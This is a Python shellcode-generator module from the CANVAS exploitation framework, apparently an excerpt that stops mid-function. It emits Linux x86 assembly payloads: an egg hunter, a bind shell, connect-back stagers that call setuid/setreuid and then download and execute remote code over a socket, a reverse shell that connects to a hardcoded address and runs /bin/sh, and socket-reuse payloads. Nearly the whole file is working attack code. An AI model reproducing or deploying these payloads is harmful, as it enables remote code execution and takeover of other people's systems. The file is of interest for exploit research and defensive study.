#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
Linux x86 shellcode generator
"""

from x86shellcodegenerator import X86
from exploitutils import *
from MOSDEF import mosdef, GetMOSDEFlibc

import struct
import socket

class linux_X86(X86):
    def __init__(self):
        X86.__init__(self)
        self.libc = GetMOSDEFlibc('Linux', 'i386')
        
        self.handlers["GOFindSock"]=self.GOFindSock
        self.handlers["GOFindSockSegment"]=self.GOFindSockSegment
        self.handlers["oldGOFindSock"]=self.oldGOFindSock
        self.handlers["GOFindSockWithShell"]=self.GOFindSockWithShell
        self.handlers["dup2"]=self.dup2
        self.handlers["setuid"]=self.setuid
        self.handlers["setreuid"]=self.setreuid
        self.handlers["sendreg"]=self.sendreg
        self.handlers["read_and_exec"]=self.read_and_exec
        self.handlers["send_universal"]=self.send_universal 
        self.handlers["read_and_exec_loop"]=self.read_and_exec_loop
        self.handlers["connect"]=self.connect
        self.handlers["hikiwaza_connectback"]=self.hikiwaza_connectback
        self.handlers["socket"]=self.socket
        self.handlers["execve"]=self.execve
        self.handlers["chrootbreak"]=self.chroot
        self.handlers["ignore signals"]=self.ignore_signals
        self.handlers["setblocking"]=self.set_sock_blocking
        self.handlers["connectloop"]=self.connectloop #loops over connect and /bin/sh execve
        self.handlers["whileone"]=self.whileone
        self.handlers["BindMosdef"] = self.BindMosdef
        self.handlers["searchcode"] = self.searchcode
        
        # NEW CODE .. mmap callback that doesn't use disk [setuid/setreuid/readlen/mmap/execute]
        self.handlers['mmap_callback'] = self.mmap_callback

        # Why doesn't this use the defines from libc?
        self.syscalls={}
        self.syscalls["socketcall"]=102
        self.syscalls["SYS_socket"]=1
        self.syscalls["SYS_connect"]=3
        self.syscalls["SYS_chdir"]=12 #you can find these in MOSDEF/MOSDEFlibc/Linux.py
        self.default_tag1=0x41444146 #two random numbers that are the default tags
        self.default_tag2=0x51493133
        return
    
    def finalize(self):
        # this means attributes should add to self.code .. not self.value
        if self.code not in [0, None, ""]:
            print "Generating payload based on self.code ..."
            if self.value not in [0, None, ""]:
                print "XXX: already have a self.value .. possible payload attribute mismatch!"
            self.value = mosdef.assemble(self.code, "X86")
            return self.value
        else:
            # old school
            return self.value
            
    def searchcode(self, args):
        """
        Creates a shellcode that looks for other shellcode 
        We have to verify that some memory is valid by using SYS_chdir
        There's a 64 bit tag prepended to your shellcode.
        
        essentially this is:
        address=0
        while 1:
            address+=1
            if chdir(address)==EFAULT:
                address+=0x0fff #pagesize-1
                continue
            if chdir(address+8)==EFAULT:
                address+=0x0fff #pagesize-1
                continue
            if *address == KEY1 and *address+4 == KEY2:
                jmp *address+8                
        #EFAULT is  0xfffffff2
        #ENOENT is  0xfffffffe
        #SUCCESS is 0x00000000
        """
        startaddress=0
        if not args:
            tag1=self.default_tag1
            tag2=self.default_tag2              
        else:
            tag1=args.get("TAG1",self.default_tag1)
            tag2=args.get("TAG2",self.default_tag2)
            startaddress=args.get("startaddress",0)
        
        if startaddress!=0:
            code="""
            movl $0xSTARTADDRESS, %esi
            """.replace("STARTADDRESS","%8.8x"%startaddress)
        else:
            code="""
            xor %esi, %esi //our address = 0
            """
        
        code+="""
        jmp searchcode_loop
        searchcode_bad_page:
          addl $0x0fff,%esi
          
        searchcode_loop:
        inc %esi // address +=1
        
        push %esi //save off in case system call corrupts it
        movl $SYS_CHDIR,%eax
        movl %esi, %ebx //our address we're checking
        int $0x80 //system call (chdir)
        pop %esi //restore this
        cmp $0xfffffff2, %eax // EFAULT?
        je searchcode_bad_page

        push %esi //save this off
        leal 8(%esi), %ebx
        movl $SYS_CHDIR,%eax
        int $0x80        
        pop %esi //restore this
        cmp $0xfffffff2, %eax // EFAULT?
        je searchcode_bad_page
        
        //memory range is valid, so we need to look for our 64-bit tag
        cmp $TAG1, (%esi)
        jne searchcode_loop
        
        cmp $TAG2, 4(%esi)
        jne searchcode_loop 
        
        //we found our tag! Time to execute code at esi+8!
        add $8, %esi
        jmp *%esi
        
        """
        code = code.replace("SYS_CHDIR",str(self.syscalls["SYS_chdir"]))
        code = code.replace("TAG1","0x%8.8x"%tag1) #do we need to reverse this dword?!?
        code = code.replace("TAG2","0x%8.8x"%tag2)
        
        self.code += code
        return 
        
    def BindMosdef(self, args):
        """
        binds to a port and leaves a GO handshake ready socket in %esi
        188 bytes unencoded (including read_and_exec attribute)
        """

        BindMosdefCode="""

        xorl %eax,%eax
        pushl %eax
        pushl %eax
        movl %esp,%edi
        addl $2,(%edi)
        pushl %eax // 0
        incl %eax
        pushl %eax // 1
        movl %eax,%ebx // socket 1 
        incl %eax
        pushl %eax // 2

        movl %esp,%ecx // args
        
        movb $102,%al
        int $0x80 // get socket

        movl %eax,%esi

        incl %ebx // bind 2
        // set port
        movl $0xPORT0002,(%edi)
        pushl $16
        pushl %edi
        pushl %esi
       
        movl %esp,%ecx
         
        movb $102,%al
        int $0x80

        // ecx and arg1 are already there
        movl %ebx,4(%ecx)
        incl %ebx
        incl %ebx // listen is 4
        xorl %eax,%eax
        movb $102,%al
        int $0x80

        // accept is 5
        incl %ebx

        pushl %eax
        movl %esp,%eax
        pushl %eax
        pushl %edi
        pushl %esi

        movl %esp,%ecx
        xorl %eax,%eax
        movb $102,%al
        int $0x80

        movl %eax,%esi

        // send 'G'
        pushl $0x47474747
        movl %esp,%ecx
        // flags
        xorl %eax,%eax
        pushl %eax
        // len
        incl %eax
        pushl %eax
        // *msg
        pushl %ecx
        // s
        pushl %esi
        // args
        movl %esp,%ecx
        // send
        xorl %ebx,%ebx
        movb $9,%bl
        movb $102,%al
        int $0x80

        // recv 1
        xorl %edx,%edx
        pushl %edx
        incl %edx // len 1
        pushl %edx
        pushl %ecx
        pushl %esi
        incl %ebx // 10 is recv
        movl %esp,%ecx
        xorl %eax,%eax
        movb $102,%al
        int $0x80

        // read exec addattr needed :)

        // %esi has our fd, some code relies on it being in %ebx also
        movl %esi,%ebx
        """

        port = int(args["port"])
        import socket
        BindMosdefCode = BindMosdefCode.replace("PORT", "%.4X"%socket.htons(port))

        self.code += BindMosdefCode
        return

    def createsocket(self,args):
        """
        Calls socket() and leaves result in eax
        
        Does not add to self.value, instead, returns result in code
        """
        IPPROTO_IP=0
        SOCK_DATAGRAM=17 #make sure this is right.
        
        if "protocol" in args:
            protocol=args["protocol"]
        else:
            protocol=IPPROTO_IP
        if "type" in args:
            type=args["type"]
        else:
            type=self.libc.getdefine('SOCK_STREAM')
        if "domain" in args:
            domain=args["domain"]
        else:
            domain=self.libc.getdefine('AF_INET')
            
        code="""
        pushl %ebx //save off ebx
        pushl %ecx
        subl $20,%esp
        movl $PROTOCOL,-4(%esp)
        movl $TYPE,-8(%esp)
        movl $DOMAIN,-12(%esp)
        movl $SOCKETCALL, %ebx
        movl $SYSCALLNUMBER, %eax 
        //xorl %eax, %eax
        //movb $SYSCALLNUMBER, %al
        
        leal -12(%esp),%ecx
        int $0x80
        addl $20,%esp
        popl %ecx //restore ecx
        popl %ebx //restore ebx
        """

        code=code.replace("PROTOCOL",str(protocol))
        code=code.replace("TYPE",str(type))
        code=code.replace("DOMAIN",str(domain))
        code=code.replace("SYSCALLNUMBER",str(self.syscalls["socketcall"]))
        code=code.replace("SOCKETCALL",str(self.syscalls["SYS_socket"]))
        return code
    
    def socket(self,args):
        """
        socket() - changes self.value to create a socket in %eax
        """
        socketcode = self.createsocket(args)
        self.code += socketcode
        return

    def ignore_signals(self,args):
        """
        Ignore signals sent to me...reset them to default
        """
        code="""
        
        
        """
        
    def set_sock_blocking(self,args):
        #for now, assume socket is in ebx
        #we destroy any other attributes on the socket in this version
        code="""
        //basically this:
        //opts=0
        //fcntl(sock,F_SETFL,opts);
        //fcntl is syscall3(55,...)
        movl $55,%eax
        //sock is already in ebx
        movl $4, %ecx
        xorl %edx, %edx
        int  $0x80
        //hopefully that didn't hurt ebx
        """
        self.code += code
        return

    def hikiwaza_connectback(self, args):
        """
        'Smaller' connectback that remains untouched for hikiwaza
        """
        if "ipaddress" not in args:
            print "No ipaddress passed to connect !"
        if "port" not in args:
            print "no port in args of connect !"

        ipaddress = args["ipaddress"]
        port = args["port"]

        code="""
start:

  //WARNING: no error checking whatsoever due to size
  xorl %ecx,%ecx
  xorl %ebx,%ebx
  xorl %eax,%eax
  movb $0x17,%al
  int $0x80
  xorl %eax,%eax
  movb $0x46,%al
  int $0x80

  //socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
  xorl %eax,%eax
  pushl %eax
  popl %ebx
  pushl %eax
  popl %ecx
  movb $6,%al
  pushl %eax
  movb $1,%al
  pushl %eax
  movb $2,%al
  pushl %eax
  movl %esp,%ecx
  movb $1,%bl
  movb $102,%al
  int $0x80

  //connect(socket, struct sockaddr, 16)
connect:
  movl %eax,%esi
  xorl %eax,%eax
  pushl %eax
  popl %ebx
  //build the sockaddr struct
  pushl %eax
  pushl %eax

  //IP
  pushl $IPADDRESS
  //PORT
  pushw $PORT
  pushw $0x0002
  movl %esp,%edx
  // push the args
  movb $16,%al
  pushl %eax
  pushl %edx
  pushl %esi
  movl %esp,%ecx
  movb $3,%bl
  movb $102,%al
  int $0x80
  test %eax,%eax
  jnz connect

  //%esi has our fd
  xorl %eax,%eax
  xorl %edx,%edx
  //read the first 4 bytes..len value
  movb $4,%dl
  movl %esp,%ecx
  movl %esi,%ebx
  movb $3,%al
  int $0x80
  movl (%esp),%edi
  //our total len is in %edi..let the games begin
  //wanna read into pcloc
  jmp read_here
getmyloc:
  //copy to modify
  pushl (%esp)

readexecloop:
  xorl %eax,%eax
  movl %edi,%edx
  movl (%esp),%ecx
  movb $3,%al
  int $0x80
  cmpl %edi,%eax
  je execute
  subl %eax,%edi
  add %eax,(%esp)
  jmp readexecloop

execute:
  //jmp to execute .. ebx has the fd
  popl %esi
  popl %esi
  jmp *%esi

read_here:
call getmyloc

end:
        """
        code = code.replace("IPADDRESS", uint32fmt(istr2int(socket.inet_aton(socket.gethostbyname(ipaddress)))))
        code = code.replace("PORT", uint16fmt(byteswap_16(int(port))))
        self.code += code
        return

    def mmap_callback(self, args):
        """ does a modern mmap 2.4/2.6 only """

        host = args['host']
        port = args['port']
        
        do_setuid = args.get('do_setuid', True)
        do_exit = args.get('do_exit', True)
        
        code = """
        mmap_callback:
        """
        
        if do_setuid:
            code += """
setuid:

  xorl %ecx,%ecx
  xorl %ebx,%ebx
  xorl %eax,%eax
  movb $0x17,%al
  int $0x80

setreuid:

  xorl %eax,%eax
  movb $0x46,%al
  int $0x80
"""
        code+="""
socket:

  xorl %eax,%eax
  pushl %eax
  popl %ebx
  pushl %eax
  popl %ecx
  movb $6,%al
  pushl %eax
  movb $1,%al
  pushl %eax
  movb $2,%al
  pushl %eax
  movl %esp,%ecx
  movb $1,%bl
  movb $102,%al
  int $0x80

connect:

  movl %eax,%esi
  xorl %eax,%eax
  pushl %eax
  popl %ebx
  pushl %eax
  pushl %eax

  pushl $IPADDRESS
  pushw $PORT

  pushw $0x0002
  movl %esp,%edx
  movb $16,%al
  pushl %eax
  pushl %edx
  pushl %esi
  movl %esp,%ecx
  movb $3,%bl
  movb $102,%al
  int $0x80
  test %eax,%eax
  jnz exit

readlen:

  xorl %eax,%eax
  xorl %edx,%edx
  movb $4,%dl
  movl %esp,%ecx
  movl %esi,%ebx
  movb $3,%al //Call read(fd, buffer, 4)
  int $0x80
  movl (%esp),%edi

mmap:

  pushl %esi
  pushl %edi

  xorl %eax,%eax
  pushl %eax
  pushl $-1
  pushl $0x22
  pushl $0x7
  pushl $0x4000
  pushl %eax
  movl %esp,%ebx
  movb $90,%al
  int $0x80

  // have to add 0x2000 our initial read_exec is pcloc based
  addl $0x2000,%eax

  addl $24,%esp
  popl %edx
  movl %eax,%ecx
  popl %ebx

  pushl %eax

readcode:

  test %edx,%edx
  jz execute

  pushl %ebx
  pushl %ecx
  pushl %edx

  xorl %eax,%eax
  movb $3,%al
  int $0x80
  cmpl $-1,%eax
  je exit

  popl %edx
  popl %ecx
  popl %ebx

  subl %eax,%edx
  addl %eax,%ecx

  jmp readcode

execute:

  // ebx has fd from read call ..

  popl %eax
  call *%eax
  """
        if do_exit:
            code+="""
exit:

  xorl %ebx,%ebx
  xorl %eax,%eax
  movb $1,%al
  int $0x80
        """
        else:
            #just a label
            code+="""
            exit:
            """
        code = code.replace('IPADDRESS', '0x%X' % struct.unpack('<L', socket.inet_aton(socket.gethostbyname(host)))[0])
        code = code.replace('PORT', '0x%X' % socket.htons(int(port)))
        self.code += code 
        return

    
    def connect(self,args):
        """
        Connectback code
        Leaves current socket FD in esi
        leaves result in esi (not eax which has result of connect())
        """
        if "ipaddress" not in args:
            print "No ipaddress passed to connect!!!"
        if "port" not in args:
            print "no port in args of connect"
        ipaddress=args["ipaddress"]
        port=args["port"]
        socketcode=self.createsocket({"ipaddress" : ipaddress,
                                      "port" : port})
        connectcode="""
        //push addrlen=16 
        //eax is a socket fd from socket()
        //.byte 0xcc
        pushl %eax
        pushl %ecx //save ecx
        pushl %ebx //save ebx
        subl $40,%esp
        movl $IPADDRESS,-4(%esp)
        movl $PORT0002,-8(%esp)
        movl $0x10, -12(%esp) //8 byte instruction!
        movl %eax, -20(%esp) //fd into place before we overwrite eax
        leal -8(%esp),%eax
        movl %eax, -16(%esp)
        movl $SYSCALLNUMBER, %eax
        movl $SOCKETCALL, %ebx
        leal -20(%esp),%ecx
        int $0x80
        addl $40,%esp
        popl %ebx //restore ebx
        popl %ecx //restore ecx
        //eax has the result...0 means success
        popl %esi
        """
        connectcode=connectcode.replace("IPADDRESS", uint32fmt(istr2int(socket.inet_aton(socket.gethostbyname(ipaddress)))))
        connectcode=connectcode.replace("PORT", uint16fmt(byteswap_16(int(port))))
        connectcode=connectcode.replace("SYSCALLNUMBER",str(self.syscalls["socketcall"]))
        connectcode=connectcode.replace("SOCKETCALL",str(self.syscalls["SYS_connect"]))
        self.code += socketcode+connectcode
        return
    
    def connectloop(self,args):
        code="""
start:
        // fork
        xorl %eax,%eax
        xorl %ebx,%ebx
        movb $2,%al
        int $0x80
        cmpl %eax,%ebx
        jne parent
        // set all signal handlers to SIG_IGN (1)
        xorl %ebx,%ebx 
        xorl %ecx,%ecx
        xorl %edx,%edx
        movb $33,%dl
        incl %ecx
sigloop:
        xorl %eax,%eax
        movb $48,%al
        int $0x80
        incl %ebx
        cmpl %ebx,%edx
        jne sigloop
        // sys_socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
        xorl %eax,%eax
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        xorl %edx,%edx
        movb $12,%dl
        subl %edx,%esp
        movb $2,%bl
        movl %ebx,(%esp) // AF_INET
        decl %ebx
        movl %ebx,4(%esp) // SOCK_STREAM
        decl %ebx
        movl %ebx,8(%esp) // IPPROTO_IP
        movl %esp,%ecx
        incl %ebx // sys_socket
        movb $102,%al // socket
        int $0x80
        // sock_fd is in %eax
        // sys_connect(sock, (struct sockaddr *)rmt, 16)
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        xorl %edx,%edx
        movb $8,%dl
        subl %edx,%esp
        movb $2,%bl
        movw %bx,(%esp) // PF_INET
        movw $47138,2(%esp) // htons(8888)
        movl $0x0200a8c0,4(%esp) // inet_addr("192.168.0.2")
        movl %eax,8(%esp) // fd
        movl %esp,12(%esp) // struct sockaddr *
        movb $16,%dl
        movl %edx,16(%esp) // size
        incl %ebx
        leal 8(%esp),%ecx
        // countdown 1 second per try, try for 30 seconds
        xorl %edx,%edx
        movb $30,%dl
retry:
        pushl %ebx
        pushl %ecx
        xorl %eax,%eax
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        pushl %eax
        incl %eax
        pushl %eax
        movl %esp,%ebx
        movb $162,%al
        int $0x80
        popl %eax
        popl %eax
        popl %ecx
        popl %ebx
        xorl %eax,%eax
        movb $102,%al
        int $0x80
        // countdown
        decl %edx 
        jz exit
        cmpb $0xff,%ah
        je retry
        // dup2 the our sockfd
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        movl 8(%esp),%ebx
dup2:
        xorl %eax,%eax
        movb $63,%al
        int $0x80
        incl %ecx
        cmpb $3,%cl
        jne dup2
        pushl $0x6d6f6f62
        xorl %eax,%eax
        xorl %ecx,%ecx
        xorl %edx,%edx
        movl %esp,%ecx
        movb $4,%dl
        movb $4,%al
        int $0x80
        //shell
        xorl %eax,%eax
        pushl %eax
        pushl $0x68732f2f
        pushl $0x6e69622f
        movl %esp,%ebx
        pushl %eax
        pushl %ebx
        movl %esp,%ecx
        xorl %edx,%edx
        movb $11,%al
        int $0x80
            
parent:
        // give child sigloop time (ok so this is a crappy solution..but whatever)
        xorl %eax,%eax
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        pushl %eax
        incl %eax
        incl %eax
        incl %eax
        pushl %eax
        movl %esp,%ebx
        movb $162,%al
        int $0x80
            
exit:
        xorl %ebx,%ebx
        xorl %eax,%eax
        incl %eax
        int $0x80
end:
        """
        self.code += code
        return
    
    def oldGOFindSock(self, args):
        """
        this one just checks the first 32 fd's
        but is somewhat smaller than the new 
        one, so we keep it as an option
        """
        code = """
start:
        // fix argv[0] molestation
        xorl %eax,%eax
        movw $2056,%ax
        subl %eax,%esp
            
ourjmpstart:
        // fix SIGPIPE hecking us
        xorl %ecx,%ecx
        xorl %ebx,%ebx
        xorl %eax,%eax
        movb $14,%bl // SIGPIPE
        decl %ebx // avoiding slash r on movb
        incl %ecx // SIGN_IGN
        movb $48,%al
        int $0x80

        // %edx holds our bitmask
        xorl %edx,%edx
        pushl %edx // save our bitmask on stack
        // using %edi as bitmask counter
        xorl %edi,%edi
        incl %edi
        // using %esi as fd counter
        xorl %esi,%esi
        jmp getpeer

startsend:
        incl %esi // start at fd 0 end at 32
        xorl %ecx,%ecx
        movl %esi,%eax
        movb $31,%cl
        incl %ecx // 32
        cmpb %cl,%al // avoiding 0x20 
        je selectcall // if fd count == 32 our bitmask is done
        shll $1,%edi
getpeer:
        //insert getpeername check here
        xorl %eax,%eax
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        xorl %edx,%edx
        movb $0x10,%dl
        pushl %edx
        movl %esp,%edx // socklen_t *namelen
        pushl %eax
        pushl %eax
        pushl %eax
        pushl %eax
        movl %esp,%ecx // struct sockaddr *name
        pushl %edx  
        pushl %ecx
        pushl %esi
        movl %esp,%ecx
        xorl %ebx,%ebx
        movb $7,%bl // getpeername
        xorl %eax,%eax
        movb $102,%al // socketcall
        int $0x80
        // get to our fun
        popl %eax  
        popl %eax
        popl %eax
        xorl %eax,%eax
        popl %eax // get sin.family
        // get our other crap off the stack
        popl %ebx
        popl %ebx   
        popl %ebx
        popl %ebx
        // check if sin.family == AF_INET
        xorl %ebx,%ebx
        movb $9,%bl
        incl %ebx
        cmpb %bl,%al // AF_INET6?
        je send
        cmpb $2,%al // AF_INET?
        jne startsend // saving a jmp
send:
        pushl $0x47474747
        xorl %eax,%eax
        pushl %eax
        movb $1,%al
        pushl %eax
        xorl %ecx,%ecx
        leal 8(%esp),%ecx
        pushl %ecx
        pushl %esi
        xorl %ecx,%ecx
        movl %esp,%ecx
        xorl %ebx,%ebx
        movb $9,%bl
        movb $102,%al // send(2)
        int $0x80 // send 1 'G' on fd
        add $20,%esp // set back stackpointer
        cmpb $0xff,%ah // < 0 ?   
        je startsend  
sendsuccess:
        popl %edx
        orl %edi,%edx // add success fd to our bitmask
        pushl %edx 
        jmp startsend
selectcall:
    
        // addition, eat some time to make sure our
        // remote end has time to send the trigger
        // before checking for readable sockets
        // NANOSLEEP PATCH
        xorl %eax,%eax
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        pushl %ebx
        movb $2,%bl // wait 2 seconds
        pushl %ebx
        movl %esp,%ebx
        movb $162,%al 
        int $0x80 
        popl %eax 
        popl %eax
        //done nanosleep
        
        // we dont have a timeout so if bitmask == 0
        // we exit exit exit
        xorl %eax,%eax
        cmpl (%esp),%eax
        je exit
        movl %esi,%ebx // %esi is already maxsock+1
        movl %esp,%ecx // &socketset
        pushl %esi // save fd counter
        xorl %edx,%edx // NULL
        xorl %esi,%esi // NULL
        xorl %edi,%edi // NULL
        movb $142,%al // select(2)
        int $0x80

        popl %esi // get our fd counter back
        popl %edi // get our bitmask into %edi

rloop:
        decl %esi // 32 --> 31
        xorl %eax,%eax   
        cmpl %eax,%esi // max fd's reached
        je ourjmpstart // loop trigger check
        shll $1,%edi // shift left 1, if carry set socket is readable
        jnc rloop 
        pushl $0x68686868 // make room for our recv
        movl %esp,%ecx // read onto stack (just 1 byte read)
        xorl %edx,%edx
        pushl %edx
        incl %edx // 1 
        pushl %edx
        pushl %ecx
        pushl %esi 
        xorl %ebx,%ebx
        movb $11,%bl
        decb %bl // avoiding 'slash n' on movb
        xorl %ecx,%ecx
        movl %esp,%ecx
        xorl %eax,%eax
        movb $102,%al
        int $0x80
        cmpb $0xff,%ah // check negative return
        je rloop
        xorl %ecx,%ecx
        incl %ecx
        cmpb %cl,%al // check if 1 byte is read
        je checkbyte
        add $20,%esp // set back stack if no checkbyte
        jmp rloop

checkbyte:
        movb 16(%esp),%bl
        add $20,%esp // adjust stack pointer
        cmpb $0x4f,%bl // check if 'O' is received
        je readexec
        jmp rloop

readexec:
        // %esi has our fd ..insert whatever the heck you wanna do to it here
        xorl %eax,%eax
        xorl %edx,%edx
        // read the first 4 bytes..len value
        movb $4,%dl
        movl %esp,%ecx
        movl %esi,%ebx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        je exit
        movl (%esp),%edi
        // our total len is in %edi..let the games begin

        // wanna read into pcloc
        jmp read_here
getmyloc:
        // copy to modify
        pushl (%esp)
readexecloop:
        xorl %eax,%eax
        movl %edi,%edx
        movl (%esp),%ecx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        je exit
        cmpl %edi,%eax
        je execute
        subl %eax,%edi
        add %eax,(%esp)
        jmp readexecloop

execute:
        // jmp to execute .. ebx has the fd
        popl %esi
        popl %esi
        jmp *%esi
                
exit:
        xorl %ebx,%ebx
        xorl %eax,%eax
        incl %eax
        int $0x80

read_here:
        call getmyloc
end:
    """
        self.code += code
        return
    
    def GOFindSock(self,args):
        """
        the new default Linux GO code (NAT friendly)
        
        this one does 1024 fd's in one go, thus preventing
        high FD segment search timeouts on laggy connections
        it's generally more clean and robust
        """
        code = """

// a small GO code (does 0-1024 fd)
// indented for her pleasure

start:

    // ignore SIGPIPE
    xorl    %ecx,%ecx
    xorl    %ebx,%ebx
    xorl    %eax,%eax
    movb    $13,%bl  
    incl    %ecx     
    movb    $48,%al  
    int     $0x80    

gofindsock:
    // the bitmask we maintain
    xorl    %eax,%eax
    xorl    %ecx,%ecx
    movb    $32,%cl  

pushmask:
    pushl   %eax
    loop    pushmask
    
    // push fd count
    movw    $1024,%cx
    pushl   %ecx

    // save base
    movl    %esp,%esi

check_fds:
    xorl    %ebx,%ebx
    decl    %ebx
    xorl    %eax,%eax
    // start at 1024, real start 1023
    decl    (%esi)

    // -1 ? done
    cmpl    (%esi),%ebx
    je      bitmask_done

    xorl    %ecx,%ecx
    movb    $5,%cl   

pusharg:
    pushl   %eax
    loop    pusharg
    
    movl    %esp,%edi

    movb    $0x10,%al
    movl    %eax,16(%edi)
    // socklen_t *namelen
    leal    16(%edi),%ecx
    pushl   %ecx
    pushl   %edi

    xorl    %ebx,%ebx
    movb    $7,%bl

    movb    $102,%al 
    // push fd count 
    pushl   (%esi)   
    movl    %esp,%ecx
    int     $0x80    

    // get result    
    movl    (%edi),%eax
    cmpb    $10,%al
    je      trigger
    cmpb    $2,%al
    je      trigger  
    
    movl    %esi,%esp
    jmp     check_fds

trigger:
    // reset to base
    movl    %esi,%esp
    
    xorl    %eax,%eax
    xorl    %ecx,%ecx
    movb    $0x47,%cl
    pushl   %ecx
    movl    %esp,%ecx
    pushl   %eax
    incl    %eax
    pushl   %eax
    pushl   %ecx
    pushl   (%esi)   
    movl    %esp,%ecx
    xorl    %eax,%eax
    xorl    %ebx,%ebx
    movb    $9,%bl
    movb    $102,%al   
    int     $0x80

    // reset to base 
    movl    %esi,%esp
    cmpb    $1,%al
    jne     check_fds
    
    // add to mask 
    // start of first dword in mask
    leal    4(%esi),%edi
    movl    (%esi),%ecx
    xorl    %eax,%eax
    xorl    %ebx,%ebx
    xorl    %edx,%edx
    movb    $32,%al
    movb    $4,%dl
    incl    %ebx

    // first find the right dword in the mask
    //int3

index_mask:
    cmpl    %eax,%ecx
    jge     up_index 

    // we're at the right word, bit to set is in %ecx
shift_it:
    test    %ecx,%ecx
    jz      zero_fd
    shll    $1,%ebx
    loop    shift_it
zero_fd:
    // or in the right bit
    orl     %ebx,(%edi)
    
    jmp     check_fds

up_index:
    subl    %eax,%ecx
    addl    %edx,%edi
    jmp     index_mask

bitmask_done:

    // call select on our mask

    xorl    %ebx,%ebx
    movw    $1024,%bx
    leal    4(%esi),%ecx
    xorl    %edx,%edx
    pushl   %esi     
    xorl    %esi,%esi
    // timeout
    pushl   %edx
    pushl   $4
    movl    %esp,%edi  
    xorl    %eax,%eax
    movb    $142,%al
    int     $0x80    
    // restore base ref
    movl    8(%esp),%esi
    
    test    %eax,%eax
    jz      restart
    
    // check result
    //int3
    leal    4(%esi),%esp
    xorl    %ecx,%ecx
    xorl    %ebx,%ebx
    popl    %edi   
    //int3

loop_mask:

    cmpb    $32,%bl
    jne     nopop
    popl    %edi
    xorl    %ebx,%ebx
nopop:
    // shift right ! 
    shrl    $1,%edi
    jc      check_trigger
notrigger:
    incl    %ecx
    cmpw    $1024,%cx
    je      restart
    incl    %ebx
    jmp     loop_mask
    
check_trigger:
    pushl   %esp
    pushl   %ebx
    pushl   %ecx

    // got a return fd in ecx
    xorl    %eax,%eax
    pushl   %eax
    movl    %esp,%edx
    pushl   %eax
    incl    %eax
    pushl   %eax
    pushl   %edx
    pushl   %ecx
    xorl    %ebx,%ebx
    movb    $10,%bl
    movl    %esp,%ecx
    movb    $102,%al 
    int     $0x80

    addl    $20,%esp
    popl    %ecx
    popl    %ebx
    popl    %esp

    movl    (%edx),%eax
    cmpb    $0x4f,%al  
    je      trigger_success
    
    jmp     notrigger
    
restart:
    addl    $128,%esi
    movl    %esi,%esp
    jmp     gofindsock  

trigger_success:
    // sleep a little to make sure len value is on the wire
    // we're not using select etc. anymore because we're in
    // a predictable world now

    // NANOSLEEP PATCH
    pushl %ecx
    xorl %eax,%eax
    xorl %ebx,%ebx
    xorl %ecx,%ecx
    pushl %ebx
    movb $2,%bl // wait 2 seconds
    pushl %ebx
    movl %esp,%ebx
    movb $162,%al 
    int $0x80 
    popl %eax 
    popl %eax
    popl %ecx
    //done nanosleep
    
    // fd in %ecx 
    movl    %ecx,%ebx
    xorl    %eax,%eax
    xorl    %edx,%edx
    // read the first 4 bytes..len value
    movb    $4,%dl
    movl    %esp,%ecx
    movb    $3,%al
    int     $0x80    
    cmpb    $0xff,%ah
    // jmp to exit on -1 
// XXX uh?
    je      trigger_success
    movl    (%esp),%edi
 
       // our total len is in %edi..let the games begin
       // wanna read into pcloc
       jmp read_here
getmyloc:
        // copy to modify
        pushl (%esp)
readexecloop:
        xorl %eax,%eax
        movl %edi,%edx
        movl (%esp),%ecx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        je exit
        cmpl %edi,%eax
        je execute
        subl %eax,%edi
        add %eax,(%esp)
        jmp readexecloop

execute:
        // jmp to execute .. ebx has the fd
        popl %esi
        popl %esi
        jmp *%esi

exit:
        xorl %ebx,%ebx
        xorl %eax,%eax
        incl %eax
        int $0x80

read_here:
       call getmyloc

end:

     """
        self.code += code
        return

    def GOFindSockSegment(self,args):
        """
        Linux GO code NAT friendly socket recycling
        this one can search any fd range (allthough this is mostly
        limited by select itself) using fd indexing and 32 fd
        bitmask segmenting
        """
        code = """
start:
        // ignore SIGPIPE
        xorl %ecx,%ecx
        xorl %ebx,%ebx
        xorl %eax,%eax
        movb $13,%bl // SIGPIPE
        incl %ecx // SIGN_IGN
        movb $48,%al
        int $0x80

        // %edi --> global fd index
        xorl %edi,%edi
        // %esi --> global fd count
        xorl %esi,%esi

        jmp baseindex

up_fd_index:
        // indicates the next 32 fds
        incl %edi
baseindex:
        xorl %eax,%eax
        // segment bitmask
        pushl %eax
        // internal 32 range fd count
        pushl %eax

getpeer:
        // check 32 fd range
        // if AF_INET or AF_INET6, send trigger
        // and add to bitmask
        xorl %eax,%eax
        xorl %ebx,%ebx

        movb $0x10,%bl
        pushl %ebx
        // socklen_t *namelen
        movl %esp,%edx

        pushl %eax
        pushl %eax
        pushl %eax
        pushl %eax
        // struct sockaddr *name
        movl %esp,%ecx

        // push args
        pushl %edx
        pushl %ecx
        // %esi holds fd
        pushl %esi

        // args
        movl %esp,%ecx
        // getpeername
        movb $7,%bl
        // socket call
        movb $102,%al
        int $0x80
        // reset stackpointer to point to result
        addl $12,%esp
        popl %eax
        // reset stackpointer for rest junk
        addl $16,%esp
        // check for AF_INET6
        cmpb $10,%al
        je send_trigger
        // check for AF_INET
        cmpb $2,%al
        je send_trigger  

        jmp next_fd   

send_trigger:

        // 'G'
        pushl $0x47474747
        // flags
        xorl %eax,%eax
        pushl %eax
        // len
        incl %eax
        pushl %eax
        // *msg
        xorl %ecx,%ecx
        leal 8(%esp),%ecx
        pushl %ecx
        // s
        pushl %esi
        // args
        movl %esp,%ecx
        // send   
        xorl %ebx,%ebx
        movb $9,%bl
        movb $102,%al
        int $0x80
        // reset stackpointer
        addl $20,%esp
        // anything but 1 is failure
        cmpb $1,%al   
        je send_success

        jmp next_fd   

send_success:
        // get the internal fd count
        popl %eax
        // get the internal bitmask
